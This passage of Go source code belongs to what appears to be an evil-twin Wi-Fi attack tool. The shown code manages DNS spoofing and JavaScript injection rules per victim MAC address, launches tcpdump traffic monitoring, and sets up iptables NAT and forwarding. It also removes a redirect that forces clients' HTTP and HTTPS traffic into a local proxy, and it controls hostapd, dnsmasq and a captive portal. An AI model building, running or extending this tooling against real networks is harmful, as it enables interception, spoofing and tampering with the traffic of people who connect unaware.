	fmt.Printf("%s  [2] Client-specific rules%s\n", utils.Green, utils.Reset)
	fmt.Printf("%sChoose option: %s", utils.Green, utils.Reset)

	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)

	switch input {
	case "1":
		rulesMutex.RLock()
		entries := sortedDNSRules(dnsSpoof)
		rulesMutex.RUnlock()
		if len(entries) == 0 {
			fmt.Printf("%s[!] No global DNS spoof rules to remove%s\n", utils.Red, utils.Reset)
			utils.PauseForInput()
			return
		}

		fmt.Printf("\n%sGlobal DNS spoof rules:%s\n", utils.Blue, utils.Reset)
		for i, rule := range entries {
			fmt.Printf("%s  [%d] %s -> %s%s\n", utils.Green, i+1, rule.Domain, rule.Target, utils.Reset)
		}
		fmt.Printf("%sChoose rule to remove: %s", utils.Green, utils.Reset)
		index, ok := readChoiceIndex(reader, len(entries))
		if !ok {
			fmt.Printf("%s[!] Invalid selection%s\n", utils.Red, utils.Reset)
			utils.PauseForInput()
			return
		}

		domain := entries[index].Domain
		rulesMutex.Lock()
		delete(dnsSpoof, domain)
		rulesMutex.Unlock()
		fmt.Printf("%s[✓] Removed global DNS spoof rule: %s%s\n", utils.Green, domain, utils.Reset)

	case "2":
		rulesMutex.RLock()
		var macs []string
		for mac, rules := range clientDNSSpoof {
			if len(rules) > 0 {
				macs = append(macs, mac)
			}
		}
		rulesMutex.RUnlock()
		if len(macs) == 0 {
			fmt.Printf("%s[!] No client-specific DNS spoof rules to remove%s\n", utils.Red, utils.Reset)
			utils.PauseForInput()
			return
		}

		sort.Strings(macs)
		fmt.Printf("\n%sClients with DNS spoof rules:%s\n", utils.Blue, utils.Reset)
		for i, mac := range macs {
			fmt.Printf("%s  [%d] %s%s\n", utils.Green, i+1, mac, utils.Reset)
		}
		fmt.Printf("%sChoose client: %s", utils.Green, utils.Reset)
		clientIndex, ok := readChoiceIndex(reader, len(macs))
		if !ok {
			fmt.Printf("%s[!] Invalid selection%s\n", utils.Red, utils.Reset)
			utils.PauseForInput()
			return
		}
		selectedMAC := macs[clientIndex]

		rulesMutex.RLock()
		entries := sortedDNSRules(clientDNSSpoof[selectedMAC])
		rulesMutex.RUnlock()
		if len(entries) == 0 {
			fmt.Printf("%s[!] No DNS spoof rules found for %s%s\n", utils.Red, selectedMAC, utils.Reset)
			utils.PauseForInput()
			return
		}

		fmt.Printf("\n%sDNS spoof rules for %s:%s\n", utils.Blue, selectedMAC, utils.Reset)
		for i, rule := range entries {
			fmt.Printf("%s  [%d] %s -> %s%s\n", utils.Green, i+1, rule.Domain, rule.Target, utils.Reset)
		}
		fmt.Printf("%sChoose rule to remove: %s", utils.Green, utils.Reset)
		ruleIndex, ok := readChoiceIndex(reader, len(entries))
		if !ok {
			fmt.Printf("%s[!] Invalid selection%s\n", utils.Red, utils.Reset)
			utils.PauseForInput()
			return
		}
		domain := entries[ruleIndex].Domain

		rulesMutex.Lock()
		if rules, exists := clientDNSSpoof[selectedMAC]; exists {
			delete(rules, domain)
			if len(rules) == 0 {
				delete(clientDNSSpoof, selectedMAC)
			}
		}
		rulesMutex.Unlock()
		fmt.Printf("%s[✓] Removed DNS spoof rule for %s: %s%s\n", utils.Green, selectedMAC, domain, utils.Reset)

	default:
		fmt.Printf("%s[!] Invalid option%s\n", utils.Red, utils.Reset)
	}

	utils.PauseForInput()
}

func removeJavaScriptRule() {
	utils.ClearTerminal()
	fmt.Printf("\n%s═══ REMOVE JAVASCRIPT RULE ═══%s\n\n", utils.Yellow, utils.Reset)

	reader := bufio.NewReader(os.Stdin)
	fmt.Printf("%sRemove from:%s\n", utils.Green, utils.Reset)
	fmt.Printf("%s  [1] Global rule%s\n", utils.Green, utils.Reset)
	fmt.Printf("%s  [2] Client-specific rule%s\n", utils.Green, utils.Reset)
	fmt.Printf("%sChoose option: %s", utils.Green, utils.Reset)

	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)

	switch input {
	case "1":
		rulesMutex.RLock()
		js := injectedJS
		rulesMutex.RUnlock()
		if js == "" {
			fmt.Printf("%s[!] No global JavaScript rule to remove%s\n", utils.Red, utils.Reset)
			utils.PauseForInput()
			return
		}

		fmt.Printf("%sCurrent global JS:%s\n  %s\n", utils.Blue, utils.Reset, js)
		fmt.Printf("%sRemove this rule? (y/n): %s", utils.Green, utils.Reset)
		confirm, _ := reader.ReadString('\n')
		confirm = strings.ToLower(strings.TrimSpace(confirm))
		if confirm != "y" && confirm != "yes" {
			fmt.Printf("%s[*] Cancelled%s\n", utils.Yellow, utils.Reset)
			utils.PauseForInput()
			return
		}

		rulesMutex.Lock()
		injectedJS = ""
		rulesMutex.Unlock()
		fmt.Printf("%s[✓] Removed global JavaScript rule%s\n", utils.Green, utils.Reset)

	case "2":
		rulesMutex.RLock()
		var macs []string
		for mac, js := range clientInjectedJS {
			if strings.TrimSpace(js) != "" {
				macs = append(macs, mac)
			}
		}
		rulesMutex.RUnlock()
		if len(macs) == 0 {
			fmt.Printf("%s[!] No client-specific JavaScript rules to remove%s\n", utils.Red, utils.Reset)
			utils.PauseForInput()
			return
		}

		sort.Strings(macs)
		fmt.Printf("\n%sClients with JavaScript rules:%s\n", utils.Blue, utils.Reset)
		for i, mac := range macs {
			fmt.Printf("%s  [%d] %s%s\n", utils.Green, i+1, mac, utils.Reset)
		}
		fmt.Printf("%sChoose client: %s", utils.Green, utils.Reset)
		clientIndex, ok := readChoiceIndex(reader, len(macs))
		if !ok {
			fmt.Printf("%s[!] Invalid selection%s\n", utils.Red, utils.Reset)
			utils.PauseForInput()
			return
		}
		selectedMAC := macs[clientIndex]

		rulesMutex.RLock()
		js := clientInjectedJS[selectedMAC]
		rulesMutex.RUnlock()
		fmt.Printf("%sCurrent JS for %s:%s\n  %s\n", utils.Blue, selectedMAC, utils.Reset, js)
		fmt.Printf("%sRemove this rule? (y/n): %s", utils.Green, utils.Reset)
		confirm, _ := reader.ReadString('\n')
		confirm = strings.ToLower(strings.TrimSpace(confirm))
		if confirm != "y" && confirm != "yes" {
			fmt.Printf("%s[*] Cancelled%s\n", utils.Yellow, utils.Reset)
			utils.PauseForInput()
			return
		}

		rulesMutex.Lock()
		delete(clientInjectedJS, selectedMAC)
		rulesMutex.Unlock()
		fmt.Printf("%s[✓] Removed JavaScript rule for %s%s\n", utils.Green, selectedMAC, utils.Reset)

	default:
		fmt.Printf("%s[!] Invalid option%s\n", utils.Red, utils.Reset)
	}

	utils.PauseForInput()
}

func removeAllGlobalRules() {
	utils.ClearTerminal()
	fmt.Printf("\n%s═══ REMOVE ALL GLOBAL RULES ═══%s\n\n", utils.Yellow, utils.Reset)

	rulesMutex.RLock()
	blockedCount := len(blockedSites)
	dnsCount := len(dnsSpoof)
	hasJS := strings.TrimSpace(injectedJS) != ""
	rulesMutex.RUnlock()

	if blockedCount == 0 && dnsCount == 0 && !hasJS {
		fmt.Printf("%s[!] No global rules to remove%s\n", utils.Red, utils.Reset)
		utils.PauseForInput()
		return
	}

	fmt.Printf("%sGlobal rules summary:%s\n", utils.Blue, utils.Reset)
	fmt.Printf("  blocked websites: %d\n", blockedCount)
	fmt.Printf("  dns spoof rules: %d\n", dnsCount)
	fmt.Printf("  javascript rule: %t\n\n", hasJS)

	reader := bufio.NewReader(os.Stdin)
	fmt.Printf("%sRemove all global rules? (y/n): %s", utils.Green, utils.Reset)
	confirm, _ := reader.ReadString('\n')
	confirm = strings.ToLower(strings.TrimSpace(confirm))
	if confirm != "y" && confirm != "yes" {
		fmt.Printf("%s[*] Cancelled%s\n", utils.Yellow, utils.Reset)
		utils.PauseForInput()
		return
	}

	rulesMutex.Lock()
	blockedSites = []string{}
	dnsSpoof = make(map[string]string)
	injectedJS = ""
	rulesMutex.Unlock()

	fmt.Printf("%s[✓] Removed all global rules%s\n", utils.Green, utils.Reset)
	utils.PauseForInput()
}

func removeAllClientRules() {
	utils.ClearTerminal()
	fmt.Printf("\n%s═══ REMOVE ALL CLIENT RULES ═══%s\n\n", utils.Yellow, utils.Reset)

	rulesMutex.RLock()
	clientSet := make(map[string]bool)
	for mac, values := range clientBlockedSites {
		if len(values) > 0 {
			clientSet[mac] = true
		}
	}
	for mac, values := range clientDNSSpoof {
		if len(values) > 0 {
			clientSet[mac] = true
		}
	}
	for mac, js := range clientInjectedJS {
		if strings.TrimSpace(js) != "" {
			clientSet[mac] = true
		}
	}
	rulesMutex.RUnlock()

	if len(clientSet) == 0 {
		fmt.Printf("%s[!] No client-specific rules to remove%s\n", utils.Red, utils.Reset)
		utils.PauseForInput()
		return
	}

	macs := make([]string, 0, len(clientSet))
	for mac := range clientSet {
		macs = append(macs, mac)
	}
	sort.Strings(macs)

	fmt.Printf("%sClients with custom rules:%s\n", utils.Blue, utils.Reset)
	for i, mac := range macs {
		fmt.Printf("%s  [%d] %s%s\n", utils.Green, i+1, mac, utils.Reset)
	}

	reader := bufio.NewReader(os.Stdin)
	fmt.Printf("%sChoose client: %s", utils.Green, utils.Reset)
	index, ok := readChoiceIndex(reader, len(macs))
	if !ok {
		fmt.Printf("%s[!] Invalid selection%s\n", utils.Red, utils.Reset)
		utils.PauseForInput()
		return
	}

	selectedMAC := macs[index]

	rulesMutex.RLock()
	blockedCount := len(clientBlockedSites[selectedMAC])
	dnsCount := len(clientDNSSpoof[selectedMAC])
	hasJS := strings.TrimSpace(clientInjectedJS[selectedMAC]) != ""
	rulesMutex.RUnlock()

	fmt.Printf("\n%sRules for %s:%s\n", utils.Blue, selectedMAC, utils.Reset)
	fmt.Printf("  blocked websites: %d\n", blockedCount)
	fmt.Printf("  dns spoof rules: %d\n", dnsCount)
	fmt.Printf("  javascript rule: %t\n\n", hasJS)

	fmt.Printf("%sRemove all rules for %s? (y/n): %s", utils.Green, selectedMAC, utils.Reset)
	confirm, _ := reader.ReadString('\n')
	confirm = strings.ToLower(strings.TrimSpace(confirm))
	if confirm != "y" && confirm != "yes" {
		fmt.Printf("%s[*] Cancelled%s\n", utils.Yellow, utils.Reset)
		utils.PauseForInput()
		return
	}

	rulesMutex.Lock()
	delete(clientBlockedSites, selectedMAC)
	delete(clientDNSSpoof, selectedMAC)
	delete(clientInjectedJS, selectedMAC)
	rulesMutex.Unlock()

	fmt.Printf("%s[✓] Removed all rules for %s%s\n", utils.Green, selectedMAC, utils.Reset)
	utils.PauseForInput()
}

func readChoiceIndex(reader *bufio.Reader, max int) (int, bool) {
	if max <= 0 {
		return 0, false
	}

	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(input)

	var idx int
	if _, err := fmt.Sscanf(input, "%d", &idx); err != nil || idx < 1 || idx > max {
		return 0, false
	}

	return idx - 1, true
}

func removeStringValue(values []string, target string) []string {
	filtered := make([]string, 0, len(values))
	for _, value := range values {
		if value != target {
			filtered = append(filtered, value)
		}
	}
	return filtered
}

func sortedDNSRules(rules map[string]string) []dnsRuleEntry {
	entries := make([]dnsRuleEntry, 0, len(rules))
	for domain, target := range rules {
		entries = append(entries, dnsRuleEntry{
			Domain: domain,
			Target: target,
		})
	}
	sort.Slice(entries, func(i, j int) bool {
		return entries[i].Domain < entries[j].Domain
	})
	return entries
}

func launchTrafficMonitor() {
	fmt.Printf("\n%s[*] Launching traffic monitor...%s\n", utils.Yellow, utils.Reset)

	if runtime.GOOS == "windows" {
		launchTrafficMonitorWindows()
	} else {
		launchTrafficMonitorLinux()
	}

	utils.PauseForInput()
}

func launchTrafficMonitorWindows() {
	scriptContent := `
@echo off
title Traffic Monitor
color 0A
echo ================================================
echo              TRAFFIC MONITOR
echo ================================================
echo.
echo [*] Monitoring all traffic through gateway...
echo [*] Press Ctrl+C to stop
echo.
echo ================================================
echo.

:loop
netstat -an | findstr ESTABLISHED
timeout /t 2 >nul
goto loop
`

	os.WriteFile("traffic_monitor.bat", []byte(scriptContent), 0644)

	cmd := exec.Command("cmd", "/c", "start", "traffic_monitor.bat")
	cmd.Start()
}

func launchTrafficMonitorLinux() {
	if apInterface == "" {
		fmt.Printf("%s[!] No active interface%s\n", utils.Red, utils.Reset)
		return
	}

	scriptContent := fmt.Sprintf(`#!/bin/bash
clear
echo "================================================"
echo "              TRAFFIC MONITOR"
echo "================================================"
echo ""
echo "[*] Monitoring interface: %s"
echo "[*] Press Ctrl+C to stop"
echo ""
echo "================================================"
echo ""

tcpdump -i %s -n -l 2>/dev/null | while read line; do
    echo "$line"
done
`, apInterface, apInterface)

	os.WriteFile("/tmp/traffic_monitor.sh", []byte(scriptContent), 0755)

	if _, err := exec.LookPath("gnome-terminal"); err == nil {
		exec.Command("gnome-terminal", "--", "bash", "/tmp/traffic_monitor.sh").Start()
	} else if _, err := exec.LookPath("xterm"); err == nil {
		exec.Command("xterm", "-e", "bash /tmp/traffic_monitor.sh").Start()
	} else if _, err := exec.LookPath("konsole"); err == nil {
		exec.Command("konsole", "-e", "bash /tmp/traffic_monitor.sh").Start()
	} else {
		fmt.Printf("%s[!] No terminal emulator found. Install gnome-terminal or xterm.%s\n", utils.Red, utils.Reset)
		return
	}
}

func stopAP() {
	apRunning = false

	fmt.Printf("\n%s[*] Stopping AP and cleaning up...%s\n", utils.Yellow, utils.Reset)

	processMu.Lock()
	proxy := proxyServer
	captive := captiveServer
	processMu.Unlock()

	if proxy != nil {
		fmt.Printf("%s[*] Stopping HTTP proxy...%s\n", utils.Yellow, utils.Reset)
		ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
		proxy.Shutdown(ctx)
		cancel()
	}
	if captive != nil {
		fmt.Printf("%s[*] Stopping captive portal...%s\n", utils.Yellow, utils.Reset)
		ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
		captive.Shutdown(ctx)
		cancel()
	}

	if runtime.GOOS == "windows" {
		fmt.Printf("%s[*] Stopping hosted network...%s\n", utils.Yellow, utils.Reset)
		exec.Command("netsh", "wlan", "stop", "hostednetwork").Run()
	} else {
		fmt.Printf("%s[*] Stopping hostapd and dnsmasq...%s\n", utils.Yellow, utils.Reset)
		stopManagedProcess(&hostapdCmd)
		stopManagedProcess(&dnsmasqCmd)
		time.Sleep(500 * time.Millisecond)

		fmt.Printf("%s[*] Cleaning up firewall rules...%s\n", utils.Yellow, utils.Reset)
		cleanupEvilTwinRedirect(apInterface)
		cleanupInternetSharing(apInterface, internetInterface)

		fmt.Printf("%s[*] Restoring wireless interface...%s\n", utils.Yellow, utils.Reset)
		restoreWirelessInterfaceManagement(apInterface)
		if internetInterface != "" && internetInterface != apInterface && isWirelessInterface(internetInterface) {
			restoreWirelessInterfaceManagement(internetInterface)
		}
	}

	connectedClients = make(map[string]*Client)
	rulesMutex.Lock()
	blockedSites = []string{}
	dnsSpoof = make(map[string]string)
	injectedJS = ""
	clientBlockedSites = make(map[string][]string)
	clientDNSSpoof = make(map[string]map[string]string)
	clientInjectedJS = make(map[string]string)
	rulesMutex.Unlock()
	provideInternet = false
	internetInterface = ""
	apInterface = ""
	ifaceManagedByNM = false
	dnsmasqLeasesPath = ""
	natConfigured = false
	redirectConfigured = false

	fmt.Printf("%s[✓] Cleanup completed successfully%s\n", utils.Green, utils.Reset)
	fmt.Printf("%s[✓] Internet connection and wireless adapter restored%s\n", utils.Green, utils.Reset)
	time.Sleep(2 * time.Second)
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func formatBytes(bytes int64) string {
	const (
		KB = 1024
		MB = KB * 1024
		GB = MB * 1024
	)

	switch {
	case bytes >= GB:
		return fmt.Sprintf("%.2f GB", float64(bytes)/float64(GB))
	case bytes >= MB:
		return fmt.Sprintf("%.2f MB", float64(bytes)/float64(MB))
	case bytes >= KB:
		return fmt.Sprintf("%.2f KB", float64(bytes)/float64(KB))
	default:
		return fmt.Sprintf("%d B", bytes)
	}
}

func configureInternetSharing(apIface string) error {
	upstreamIface, err := detectInternetInterface(apIface)
	if err != nil {
		return err
	}

	if upstreamIface == "" {
		return fmt.Errorf("no upstream interface with internet route")
	}

	if upstreamIface == apIface {
		return fmt.Errorf("upstream interface matches AP interface (%s); use a different host uplink like ethernet, USB tethering/mobile data, or a second Wi-Fi adapter", apIface)
	}

	internetInterface = upstreamIface

	if err := exec.Command("sysctl", "-w", "net.ipv4.ip_forward=1").Run(); err != nil {
		return fmt.Errorf("failed enabling ip_forward: %w", err)
	}

	if err := ensureIptablesRule([]string{"-t", "nat", "POSTROUTING", "-o", upstreamIface, "-j", "MASQUERADE"}); err != nil {
		return fmt.Errorf("failed NAT rule: %w", err)
	}
	if err := ensureIptablesRule([]string{"FORWARD", "-i", apIface, "-o", upstreamIface, "-j", "ACCEPT"}); err != nil {
		return fmt.Errorf("failed forward rule AP->WAN: %w", err)
	}
	if err := ensureIptablesRule([]string{"FORWARD", "-i", upstreamIface, "-o", apIface, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"}); err != nil {
		return fmt.Errorf("failed forward rule WAN->AP: %w", err)
	}

	natConfigured = true
	fmt.Printf("%s[*] Internet uplink detected: %s%s\n", utils.Yellow, upstreamIface, utils.Reset)
	return nil
}

func cleanupInternetSharing(apIface, upstreamIface string) {
	if !natConfigured || apIface == "" || upstreamIface == "" {
		natConfigured = false
		return
	}

	deleteIptablesRule([]string{"FORWARD", "-i", upstreamIface, "-o", apIface, "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"})
	deleteIptablesRule([]string{"FORWARD", "-i", apIface, "-o", upstreamIface, "-j", "ACCEPT"})
	deleteIptablesRule([]string{"-t", "nat", "POSTROUTING", "-o", upstreamIface, "-j", "MASQUERADE"})
	natConfigured = false
}

func cleanupEvilTwinRedirect(apIface string) {
	if !redirectConfigured || apIface == "" {
		redirectConfigured = false
		return
	}

	deleteIptablesRule([]string{"-t", "nat", "PREROUTING", "-i", apIface, "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "8888"})
	deleteIptablesRule([]string{"-t", "nat", "PREROUTING", "-i", apIface, "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", "8888"})
	redirectConfigured = false
}

func ensureIptablesRule(ruleSpec []string) error {
	checkArgs := append([]string{"-C"}, ruleSpec...)
	if err := exec.Command("iptables", checkArgs...).Run(); err == nil {
		return nil
	}

	addArgs := append([]string{"-A"}, ruleSpec...)
	return exec.Command("iptables", addArgs...).Run()
}

func deleteIptablesRule(ruleSpec []string) {
	checkArgs := append([]string{"-C"}, ruleSpec...)
	if err := exec.Command("iptables", checkArgs...).Run(); err != nil {
		return
	}

	delArgs := append([]string{"-D"}, ruleSpec...)
	exec.Command("iptables", delArgs...).Run()
}

func detectInternetInterface(apIface string) (string, error) {
	routeOutput, err := exec.Command("ip", "route", "show", "default").Output()
	if err != nil {
		return "", err
	}

	lines := strings.Split(string(routeOutput), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if !strings.HasPrefix(line, "default") {
			continue
		}

		fields := strings.Fields(line)
		for i := 0; i < len(fields)-1; i++ {
			if fields[i] == "dev" {
				candidate := fields[i+1]
				if candidate != "" && candidate != apIface {
					return candidate, nil
				}
			}
		}
	}

	for _, line := range lines {
		line = strings.TrimSpace(line)
		if !strings.HasPrefix(line, "default") {
			continue
		}

		fields := strings.Fields(line)
		for i := 0; i < len(fields)-1; i++ {
			if fields[i] == "dev" {
				return fields[i+1], nil
			}
		}
	}

	return "", fmt.Errorf("default route not found")
}

func supportsAPMode() (bool, error) {
	output, err := exec.Command("iw", "list").Output()
	if err != nil {
		return false, err
	}

	text := string(output)
	if strings.Contains(text, "* AP") || strings.Contains(text, "\tAP\n") {
		return true, nil
	}
	return false, nil
}

func prepareWirelessInterfaceForAP(iface string) {
	if iface == "" {
		return
	}

	if _, err := exec.LookPath("nmcli"); err == nil {
		exec.Command("nmcli", "radio", "wifi", "on").Run()
		exec.Command("nmcli", "device", "disconnect", iface).Run()
		if err := exec.Command("nmcli", "device", "set", iface, "managed", "no").Run(); err == nil {
			ifaceManagedByNM = true
		}
	}

	exec.Command("ip", "link", "set", iface, "down").Run()
	if _, err := exec.LookPath("iw"); err == nil {
		exec.Command("iw", "dev", iface, "set", "type", "managed").Run()
	}
	exec.Command("ip", "addr", "flush", "dev", iface).Run()
	exec.Command("ip", "link", "set", iface, "up").Run()
}

func restoreWirelessInterfaceManagement(iface string) {
	if iface == "" {
		return
	}

	exec.Command("ip", "link", "set", iface, "down").Run()
	if _, err := exec.LookPath("iw"); err == nil {
		exec.Command("iw", "dev", iface, "set", "type", "managed").Run()
	}
	exec.Command("ip", "addr", "flush", "dev", iface).Run()
	exec.Command("ip", "link", "set", iface, "up").Run()

	if _, err := exec.LookPath("nmcli"); err == nil {
		exec.Command("nmcli", "networking", "on").Run()
		exec.Command("nmcli", "radio", "wifi", "on").Run()
		exec.Command("nmcli", "device", "set", iface, "managed", "yes").Run()
		exec.Command("nmcli", "connection", "reload").Run()
		exec.Command("nmcli", "device", "connect", iface).Run()
	}

	ifaceManagedByNM = false
}

func waitForHostapdReady(cmd *exec.Cmd, logPath string, timeout time.Duration) error {
	deadline := time.Now().Add(timeout)
	enabledAt := time.Time{}
	errorMarkers := []string{
		"Failed to set beacon parameters",
		"key not allowed",
		"AP-DISABLED",
		"INTERFACE-DISABLED",
	}

	for time.Now().Before(deadline) {
		if !isProcessRunning(cmd) {
			tail := readLogTail(logPath, 12)
			if tail != "" {
				return fmt.Errorf("hostapd exited early. Last log lines:\n%s", tail)
			}
			return fmt.Errorf("hostapd exited early")
		}

		content, err := os.ReadFile(logPath)
		if err == nil {
			logText := string(content)
			for _, marker := range errorMarkers {
				if strings.Contains(logText, marker) {
					tail := readLogTail(logPath, 14)
					if tail != "" {
						return fmt.Errorf("hostapd error detected. Last log lines:\n%s", tail)
					}
					return fmt.Errorf("hostapd error detected: %s", marker)
				}
			}

			if strings.Contains(logText, "AP-ENABLED") ||
				strings.Contains(logText, "interface state ENABLED") ||
				strings.Contains(logText, "Setup of interface done") {
				if enabledAt.IsZero() {
					enabledAt = time.Now()
				}
				if time.Since(enabledAt) >= 2*time.Second && isProcessRunning(cmd) {
					return nil
				}
			}
		}

		time.Sleep(250 * time.Millisecond)
	}

	return fmt.Errorf("timeout waiting for AP beacons")
}

func isProcessRunning(cmd *exec.Cmd) bool {
	if cmd == nil || cmd.Process == nil {
		return false
	}

	if cmd.ProcessState != nil && cmd.ProcessState.Exited() {
		return false
	}

	return cmd.Process.Signal(syscall.Signal(0)) == nil
}

func readLogTail(logPath string, lineCount int) string {
	if lineCount <= 0 {
		return ""
	}

	content, err := os.ReadFile(logPath)
	if err != nil {
		return ""
	}

	lines := strings.Split(strings.TrimRight(string(content), "\n"), "\n")
	if len(lines) <= lineCount {
		return strings.Join(lines, "\n")
	}

	return strings.Join(lines[len(lines)-lineCount:], "\n")
}

func writeTempConfigFile(prefix, suffix, content string) (string, error) {
	candidates := []string{os.TempDir(), sessionLogPath("runtime"), "."}
	seen := make(map[string]bool)

	for _, dir := range candidates {
		if dir == "" || seen[dir] {
			continue
		}
		seen[dir] = true

		if err := os.MkdirAll(dir, 0755); err != nil {
			continue
		}

		pattern := prefix + "*" + suffix
		file, err := os.CreateTemp(dir, pattern)
		if err != nil {
			continue
		}

		if _, err := file.WriteString(content); err != nil {
			file.Close()
			os.Remove(file.Name())
			continue
		}

		if err := file.Close(); err != nil {
			os.Remove(file.Name())
			continue
		}

		return file.Name(), nil
	}

	return "", fmt.Errorf("no writable directory found for temporary config files")
}

func initializeSessionLogDir(mode, networkName string) (string, error) {
	safeNetworkName := sanitizeLogName(networkName)
	baseDir := filepath.Join("net_logs")
	if err := os.MkdirAll(baseDir, 0755); err != nil {
		return "", err
	}

	dirName := fmt.Sprintf("%s_%s_logs", mode, safeNetworkName)
	logDir := filepath.Join(baseDir, dirName)
	if _, err := os.Stat(logDir); err == nil {
		logDir = filepath.Join(baseDir, fmt.Sprintf("%s_%s", dirName, time.Now().Format("20060102_150405")))
	} else if !os.IsNotExist(err) {
		return "", err
	}

	if err := os.MkdirAll(logDir, 0755); err != nil {
		return "", err
	}

	processMu.Lock()
	sessionLogDir = logDir
	processMu.Unlock()

	return logDir, nil
}

func sessionLogPath(fileName string) string {
	processMu.Lock()
	logDir := sessionLogDir
	processMu.Unlock()

	if logDir == "" {
		return filepath.Join("/tmp", fileName)
	}

	return filepath.Join(logDir, fileName)
}

func sanitizeLogName(input string) string {
	normalized := strings.ToLower(strings.TrimSpace(input))
	if normalized == "" {
		return "unnamed"
	}

	var builder strings.Builder
	lastUnderscore := false
	for _, r := range normalized {
		if unicode.IsLetter(r) || unicode.IsDigit(r) {
			builder.WriteRune(r)
			lastUnderscore = false
			continue
		}

		if !lastUnderscore {
			builder.WriteByte('_')
			lastUnderscore = true
		}
	}

	output := strings.Trim(builder.String(), "_")
	if output == "" {
		return "unnamed"
	}

	return output
}

func startManagedProcess(name string, args []string, logPath string) (*exec.Cmd, error) {
	logFile, err := os.OpenFile(logPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		return nil, err
	}

	cmd := exec.Command(name, args...)
	cmd.Stdout = logFile
	cmd.Stderr = logFile

	if err := cmd.Start(); err != nil {
		logFile.Close()
		return nil, err
	}

	go func(localCmd *exec.Cmd, localLog *os.File, localName, localPath string) {
		err := localCmd.Wait()
		localLog.Close()
		if apRunning && err != nil {
			fmt.Printf("\n%s[!] %s exited: %v%s\n", utils.Red, localName, err, utils.Reset)
			fmt.Printf("%s[!] See %s%s\n", utils.Yellow, localPath, utils.Reset)
		}
	}(cmd, logFile, name, logPath)

	return cmd, nil
}

func stopManagedProcess(cmdRef **exec.Cmd) {
	processMu.Lock()
	cmd := *cmdRef
	*cmdRef = nil
	processMu.Unlock()

	if cmd == nil || cmd.Process == nil {
		return
	}

	cmd.Process.Kill()
}
